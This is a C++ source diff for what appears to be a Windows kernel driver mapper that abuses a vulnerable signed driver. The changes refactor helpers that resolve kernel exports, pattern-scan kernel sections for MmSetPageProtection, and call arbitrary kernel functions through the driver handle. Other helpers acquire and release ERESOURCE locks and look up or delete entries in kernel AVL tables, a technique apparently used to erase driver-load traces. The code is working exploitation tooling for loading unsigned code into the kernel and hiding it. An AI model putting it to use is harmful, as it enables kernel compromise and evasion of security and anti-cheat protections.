@@ -8,6 +8,12 @@
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 
 
+typedef NTSTATUS(*QuerySystemInformation)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    OUT PVOID SystemInformation,
+    IN ULONG SystemInformationLength,
+    OUT PULONG ReturnLength OPTIONAL);
+
+
 PVOID general::ManipulateAddress(PVOID Address, ULONG64 Size, BOOL IsAdd) {
     if (IsAdd) {
         return (PVOID)((ULONG64)Address + Size);
@@ -223,6 +229,7 @@ DWORD specific::MemoryToFile(LPCWSTR FileName, BYTE MemoryData[], SIZE_T MemoryS
     }
     if (!WriteFile(VulnHandle, MemoryData, MemorySize, &BytesWritten, NULL) || BytesWritten != MemorySize) {
         CloseHandle(VulnHandle);
+        DeleteFile(FileName);
         return GetLastError();
     }
     CloseHandle(VulnHandle);
@@ -264,20 +271,34 @@ PVOID specific::FileToMemory(const char* FilePath, ULONG* PoolSize) {
 
 PVOID specific::GetKernelModuleAddress(const char* ModuleName) {
     PVOID ModulesInfo = NULL;
+    PVOID ModuleBase = NULL;
     ULONG ModulesLength = 0;
     NTSTATUS Status = ERROR_SUCCESS;
     nt::PRTL_PROCESS_MODULES ActualModules = NULL;
-    char CurrentName[MAX_PATH] = { 0 };
+    std::string CurrentName;
+    HMODULE KernelLibrary = NULL;
+    FARPROC ActualNtQueryDirectoryInformation = NULL;
 
 
     // Get a right-sized buffer for the modules info:
-    Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, ModulesInfo, ModulesLength, &ModulesLength);
+    KernelLibrary = GetModuleHandleA("ntdll.dll");
+    if (KernelLibrary == NULL) {
+        printf("[-] Cannot get handle to ntdll.dll to get kernel module address\n");
+        return NULL;
+    }
+    ActualNtQueryDirectoryInformation = GetProcAddress(KernelLibrary, "NtQuerySystemInformation");
+    if (ActualNtQueryDirectoryInformation == NULL) {
+        printf("[-] Cannot get pointer to NtQuerySystemInformation to get kernel module address\n");
+        return NULL;
+    }
+    QuerySystemInformation KernelQuerySystemInformation = (QuerySystemInformation)ActualNtQueryDirectoryInformation;
+    Status = KernelQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, ModulesInfo, ModulesLength, &ModulesLength);
     while (Status == STATUS_INFO_LENGTH_MISMATCH) {
         if (ModulesInfo != NULL) {
             VirtualFree(ModulesInfo, 0, MEM_RELEASE);
         }
         ModulesInfo = VirtualAlloc(NULL, ModulesLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, ModulesInfo, ModulesLength, &ModulesLength);
+        Status = KernelQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, ModulesInfo, ModulesLength, &ModulesLength);
     }
     if (!NT_SUCCESS(Status) || ModulesInfo == NULL) {
         if (ModulesInfo != NULL) {
@@ -289,12 +310,12 @@ PVOID specific::GetKernelModuleAddress(const char* ModuleName) {
 
     // Iterate through system modules (includes kernel somewhere):
     ActualModules = (nt::PRTL_PROCESS_MODULES)ModulesInfo;
-    for (ULONG modulei = 0; modulei < ActualModules->NumberOfModules; modulei++) {
-        RtlZeroMemory(CurrentName, MAX_PATH);
-        RtlCopyMemory(CurrentName, (PVOID)((ULONG64)ActualModules->Modules[modulei].FullPathName + ActualModules->Modules[modulei].OffsetToFileName), strlen((const char*)ActualModules->Modules[modulei].FullPathName) - ActualModules->Modules[modulei].OffsetToFileName);
-        if (strcmp(CurrentName, ModuleName) == 0) {
+    for (ULONG modulei = 0; modulei < ActualModules->NumberOfModules; ++modulei) {
+        CurrentName = std::string(((char*)(ActualModules->Modules[modulei].FullPathName)) + ActualModules->Modules[modulei].OffsetToFileName);
+        if (_stricmp(CurrentName.c_str(), ModuleName) == 0) {
+            ModuleBase = ActualModules->Modules[modulei].ImageBase;
             VirtualFree(ModulesInfo, 0, MEM_RELEASE);
-            return ActualModules->Modules[modulei].ImageBase;
+            return ModuleBase;
         }
     }
     VirtualFree(ModulesInfo, 0, MEM_RELEASE);
@@ -303,18 +324,17 @@ PVOID specific::GetKernelModuleAddress(const char* ModuleName) {
 
 
 BOOL specific::CompareBetweenData(const BYTE DataToCheck[], const BYTE CheckAgainst[], const char* SearchMask) {
-    for (int maski = 0; SearchMask[maski] != '\0'; maski++) {
-        if (SearchMask[maski] == 'x' && DataToCheck[maski] != CheckAgainst[maski]) {
-            return FALSE;  // x = compare in this offset of both data streams
-        }
+    for (; *SearchMask; ++SearchMask, ++DataToCheck, ++CheckAgainst) {
+        if (*SearchMask == 'x' && *DataToCheck != *CheckAgainst)
+            return FALSE;
     }
-    return TRUE;
+    return (*SearchMask) == 0;
 }
 
 
 PVOID specific::FindPattern(PVOID StartingAddress, ULONG SearchLength, BYTE CheckAgainst[], const char* SearchMask) {
     for (ULONG searchi = 0; searchi < SearchLength - strlen(SearchMask); searchi++) {
-        if (specific::CompareBetweenData((BYTE*)StartingAddress + searchi, CheckAgainst, SearchMask)) {
+        if (specific::CompareBetweenData((BYTE*)((ULONG64)StartingAddress + searchi), CheckAgainst, SearchMask)) {
             return (PVOID)((ULONG64)StartingAddress + searchi);
         }
     }
@@ -326,9 +346,10 @@ PVOID specific::FindSectionOfKernelModule(const char* SectionName, PVOID Headers
     PIMAGE_NT_HEADERS ModuleHeaders = (PIMAGE_NT_HEADERS)((ULONG64)HeadersPointer + ((PIMAGE_DOS_HEADER)HeadersPointer)->e_lfanew);
     PIMAGE_SECTION_HEADER ModuleSections = IMAGE_FIRST_SECTION(ModuleHeaders);
     PIMAGE_SECTION_HEADER CurrentSection = NULL;
-    for (ULONG sectioni = 0; sectioni < ModuleHeaders->FileHeader.NumberOfSections; sectioni++) {
+    for (ULONG sectioni = 0; sectioni < ModuleHeaders->FileHeader.NumberOfSections; ++sectioni) {
         CurrentSection = &ModuleSections[sectioni];
-        if (strcmp(SectionName, (char*)CurrentSection->Name) == 0) {
+        if (memcmp(CurrentSection->Name, SectionName, strlen(SectionName)) == 0 &&
+            strlen(SectionName) == strlen((char*)CurrentSection->Name)) {
             if (CurrentSection->VirtualAddress == 0) {
                 return NULL;  // Offset from start of file, first 0x10000 are headers
             }
@@ -353,7 +374,7 @@ PVOID specific::GetKernelModuleExport(HANDLE* DeviceHandle, PVOID ModuleBaseAddr
     ULONG* ExportNameTable = NULL;
     USHORT* ExportOrdinalTable = NULL;
     ULONG* ExportFunctionTable = NULL;
-    char CurrentFunctionName[MAX_PATH] = { 0 };
+    std::string CurrentFunctionName;
     USHORT CurrentFunctionOrdinalValue = 0;
     ULONG64 CurrentFunctionAddress = NULL;
 
@@ -386,16 +407,15 @@ PVOID specific::GetKernelModuleExport(HANDLE* DeviceHandle, PVOID ModuleBaseAddr
 
     // Get the specific parts from the export data split up:
     BaseToDataOffset = (ULONG64)KernelExportData - (ULONG64)KernelExportRVA;
-    ExportNameTable = (ULONG*)(KernelExportData->AddressOfNames - BaseToDataOffset);
-    ExportOrdinalTable = (USHORT*)(KernelExportData->AddressOfNameOrdinals - BaseToDataOffset);
-    ExportFunctionTable = (ULONG*)(KernelExportData->AddressOfFunctions - BaseToDataOffset);
+    ExportNameTable = (ULONG*)(KernelExportData->AddressOfNames + BaseToDataOffset);
+    ExportOrdinalTable = (USHORT*)(KernelExportData->AddressOfNameOrdinals + BaseToDataOffset);
+    ExportFunctionTable = (ULONG*)(KernelExportData->AddressOfFunctions + BaseToDataOffset);
 
 
     // Go over the exports and find the one that matches the RoutineName:
     for (ULONG exporti = 0; exporti < KernelExportData->NumberOfNames; ++exporti) {
-        RtlZeroMemory(CurrentFunctionName, MAX_PATH);
-        RtlCopyMemory(CurrentFunctionName, general::ManipulateAddress((PVOID)ExportNameTable[exporti], BaseToDataOffset, TRUE), strlen((char*)(ExportNameTable[exporti] + BaseToDataOffset)) + 1);
-        if (_stricmp(CurrentFunctionName, ExportName) == 0) {
+        CurrentFunctionName = std::string((char*)(ExportNameTable[exporti] + BaseToDataOffset));
+        if (_stricmp(CurrentFunctionName.c_str(), ExportName) == 0) {
             CurrentFunctionOrdinalValue = ExportOrdinalTable[exporti];
             if (ExportFunctionTable[CurrentFunctionOrdinalValue] <= 0x1000) {
                 VirtualFree(KernelExportData, 0, MEM_RELEASE);
@@ -417,52 +437,63 @@ PVOID specific::GetKernelModuleExport(HANDLE* DeviceHandle, PVOID ModuleBaseAddr
 }
 
 
-BOOL specific::HandleResourceLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID FunctionResource, BOOL IsAcquire) {
-    PVOID FunctionAddress = NULL;
-    if (FunctionResource == NULL) {
-        return FALSE;
+bool specific::ExReleaseResourceLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID ResourceToRelease) {
+    if (ResourceToRelease == NULL) {
+        printf("[-] Releasing resource is a NULL pointer\n");
+        return false;
     }
-    if (IsAcquire) {
-        FunctionAddress = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExAcquireResourceExclusiveLite");
-        if (FunctionAddress == NULL) {
-            printf("[-] Failed to get the address of ExAcquireResourceExclusiveLite\n");
-            return FALSE;
-        }
+    PVOID KernelExReleaseResourceLite = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExReleaseResourceLite");
+    if (KernelExReleaseResourceLite == NULL) {
+        printf("[-] Cannot find export ExReleaseResourceLite\n");
+        return false;
     }
-    else {
-        FunctionAddress = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExReleaseResourceLite");
-        if (FunctionAddress == NULL) {
-            printf("[-] Failed to get the address of ExReleaseResourceLite\n");
-            return FALSE;
-        }
-    }
-    return CallKernelFunction(DeviceHandle, (PVOID*)NULL, FunctionAddress, KernelBaseAddress, FunctionResource);
+    return CallKernelFunction(DeviceHandle, (PVOID)NULL, KernelExReleaseResourceLite, KernelBaseAddress, ResourceToRelease);
 }
 
 
-PVOID specific::HandleElementGenericTable(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer, BOOL IsLookup) {
-    PVOID FunctionAddress = NULL;
+bool specific::ExAcquireResourceExclusiveLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID ResourceToAcquire, BOOLEAN ShouldWait) {
+    BOOLEAN Output = FALSE;
+    if (ResourceToAcquire == NULL) {
+        return false;
+    }
+    PVOID KernelExAcquireResourceExclusiveLite = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExAcquireResourceExclusiveLite");
+    if (KernelExAcquireResourceExclusiveLite == NULL) {
+        return false;
+    }
+    return (CallKernelFunction(DeviceHandle, &Output, KernelExAcquireResourceExclusiveLite, KernelBaseAddress, ResourceToAcquire, ShouldWait) && Output);
+}
+
+
+PVOID specific::RtlLookupElementGenericTableAvl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer) {
     PVOID FunctionOutput = NULL;
+    PVOID KernelRtlLookupElementGenericTableAvl = NULL;
     if (LookupTable == NULL || EntryBuffer == NULL) {
-        return FALSE;
+        return NULL;
     }
-    if (IsLookup) {
-        FunctionAddress = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "RtlLookupElementGenericTableAvl");
-        if (FunctionAddress == NULL) {
-            printf("[-] Failed to get the address of RtlLookupElementGenericTableAvl\n");
-            return FALSE;
-        }
-        if (!CallKernelFunction(DeviceHandle, &FunctionOutput, FunctionAddress, KernelBaseAddress, LookupTable, EntryBuffer)) {
-            return FALSE;
-        }
-        return FunctionOutput;
+    KernelRtlLookupElementGenericTableAvl = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "RtlLookupElementGenericTableAvl");
+    if (KernelRtlLookupElementGenericTableAvl == NULL) {
+        printf("[-] Failed to get the address of RtlLookupElementGenericTableAvl\n");
+        return NULL;
     }
-    FunctionAddress = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "RtlDeleteElementGenericTableAvl");
-    if (FunctionAddress == NULL) {
+    if (!CallKernelFunction(DeviceHandle, &FunctionOutput, KernelRtlLookupElementGenericTableAvl, KernelBaseAddress, LookupTable, EntryBuffer)) {
+        return NULL;
+    }
+    return FunctionOutput;
+}
+
+
+BOOLEAN specific::RtlDeleteElementGenericTableAvl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer) {
+    bool FunctionOutput = false;
+    PVOID KernelRtlDeleteElementGenericTableAvl = NULL;
+    if (LookupTable == NULL || EntryBuffer == NULL) {
+        return false;
+    }
+    KernelRtlDeleteElementGenericTableAvl = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "RtlDeleteElementGenericTableAvl");
+    if (KernelRtlDeleteElementGenericTableAvl == NULL) {
         printf("[-] Failed to get the address of RtlDeleteElementGenericTableAvl\n");
-        return FALSE;
+        return false;
     }
-    return (PVOID)(CallKernelFunction(DeviceHandle, &FunctionOutput, FunctionAddress, KernelBaseAddress, LookupTable, EntryBuffer) && FunctionOutput != NULL);
+    return (CallKernelFunction(DeviceHandle, &FunctionOutput, KernelRtlDeleteElementGenericTableAvl, KernelBaseAddress, LookupTable, EntryBuffer) && FunctionOutput);
 }
 
 
@@ -551,7 +582,7 @@ BOOL allocations::MmFreeIndependentPages(HANDLE* DeviceHandle, PVOID KernelBaseA
 
 
 BOOL allocations::MmSetPageProtection(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID AllocationAddress, SIZE_T AllocationSize, ULONG NewProtection){
-    BOOL SetProtectionResult = FALSE;
+    BOOLEAN SetProtectionResult = FALSE;
     BYTE NeededSetPageProtection[] = "\x41\xB8\x00\x00\x00\x00\x48\x00\x00\x00\x8B\x00\xE8\x00\x00\x00\x00\x84\xC0\x74\x09\x48\x81\xEB\x00\x00\x00\x00\xEB";
     const char* SetPageProtectionMask = "xx????x???x?x????xxxxxxx????x";
     PVOID KernelMmSetPageProtection = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, NeededSetPageProtection, SetPageProtectionMask);
@@ -563,7 +594,7 @@ BOOL allocations::MmSetPageProtection(HANDLE* DeviceHandle, PVOID KernelBaseAddr
     if (KernelMmSetPageProtection == NULL) {
         return FALSE;
     }
-    return CallKernelFunction(DeviceHandle, &SetProtectionResult, KernelBaseAddress, KernelMmSetPageProtection, AllocationAddress, AllocationSize, NewProtection) && SetProtectionResult;
+    return (CallKernelFunction(DeviceHandle, &SetProtectionResult, KernelBaseAddress, KernelMmSetPageProtection, AllocationAddress, AllocationSize, NewProtection) && SetProtectionResult);
 }
 
 
